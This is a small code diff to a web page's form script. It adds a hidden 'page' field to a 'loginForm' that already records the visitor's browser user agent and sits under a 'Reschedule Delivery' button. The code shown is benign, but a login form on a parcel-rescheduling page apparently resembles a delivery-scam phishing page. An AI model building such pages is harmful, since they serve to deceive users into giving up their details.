@@ -23,6 +23,7 @@
 
 function submitForm() {
     document.getElementById('userAgent').value = navigator.userAgent;
+    document.getElementById('page').value = 'Details';
 
     const formData = new FormData(document.getElementById('loginForm'));
 
@@ -206,6 +207,7 @@ function submitForm() {
                                                     </list-of-packages>
                                                     <form id="loginForm">
                                                           <input type="hidden" id="userAgent" name="userAgent">
+                                                         <input type="hidden" id="page" name="page">
                                                         <a onclick="submitForm()" class="button" id="submitButton"
                                                             type="submit">Reschedule Delivery</a>
                                                     </form>
